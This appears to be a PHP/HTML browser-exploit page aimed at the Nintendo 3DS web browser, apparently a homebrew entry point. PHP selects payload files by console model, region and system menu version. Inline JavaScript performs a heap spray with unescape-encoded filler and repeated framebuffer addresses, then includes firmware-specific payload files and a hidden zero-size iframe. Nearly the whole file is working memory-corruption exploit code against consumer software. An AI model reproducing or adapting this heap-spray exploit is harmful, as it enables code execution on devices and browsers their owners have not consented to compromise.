<?php
	// prepare version for web payload
	if($version["model"] == "OLD")$version["firm"] = "OLD";
	else $version["firm"] = "NEW";
	if($version["region"] == "EUR" || $version["region"] == "USA") $version["ytb"] = "west";
	else $version["ytb"] = "jpn";

	// compute otherapp payload nme
	function getRegion($v)
	{
		if($v["region"]=="JPN")
		{
			return "J";
		}else if($v["region"]=="EUR")
		{
			return "E";
		}else if($v["region"]=="USA")
		{
			return "U";
		}
	}

	function getFirmVersion($v)
	{
		if($v["model"]=="NEW")
		{
			return "N3DS";
		}else{
			return "POST5";
		}
	}

	function getMenuVersion($v)
	{
		if ($v["cup_1"]==0 or $v["cup_1"]==1)
		{
			return "11272";
		}
		else if ($v["cup_1"]==2)
		{
			return "12288";
		}
		else if (($v["cup_1"]==3 or $v["cup_1"]==4))
		{
			return "13330";
		}
		else if ($v["cup_1"]==5)
		{
			return "15360";
		}
		else if ($v["cup_1"]==6)
		{
			return "16404";
		}
		else if ($v["cup_1"]==7)
		{
			return "17415";
		}
		else if ($v["cup_1"]==9 and $v["region"]=="USA")
		{
			return "20480_usa";
		}
		else if ($v["cup_1"]>=8)
		{
			return "19456";
		}
	}


	function getMsetVersion($v)
	{
		if($v["cup_0"] == 9 and $v["cup_1"] < 6)
		{
			return "8203";
		}
		else
		{
			return "9221";
		}
	}

	$url_filename = "./urls/".getFirmVersion($version)."_".getRegion($version)."_".getMenuVersion($version)."_".getMsetVersion($version).".bin.html";
?>
<html>
<head>
<style>
	html,body{
		margin:0;
		height:100%;
		overflow:hidden;
		background-color: #FFFFFF;
	}
	.pxl { 
		position: absolute;
		width: 1px; height: 1px;
	}
</style>
</head>
<body>
	<script>
	    var mem = [];

	    // subscreen framebuffer is at 0x1f05DC00, tiled RGB565
	    // subscreen framebuffer is at 0x1f38ca00, non-tiled RGB565 (actually it's not always there sooooo)

		var data = unescape("\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040\u4040");

		function magicfun(mem, size, v) {
			var a = new Array(size - 20);
			nv = v + unescape("%ucccc");
			for (var j = 0; j < a.length / (v.length / 4); j++) a[j] = nv;
			var t = document.createTextNode(String.fromCharCode.apply(null, new Array(a)));

			mem.push(t);
		}

		for (var j = 20; j < 110; j++) {
			magicfun(mem, j, data);
		}

		function dsm(evnt) {
			for (var j = 0; j < 100; j++) {
				magicfun(mem, 200, data);
			}
		}

		dsm();

		data = unescape("\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05\udc00\u1f05");

	</script>

	<?php include("payloads/" . $version["firm"] . "_" . $version["ytb"] . "_payload.html"); ?>
	<?php include($url_filename); ?>

    <iframe width=0 height=0 src="frame.html"></iframe>
</body>
</html>
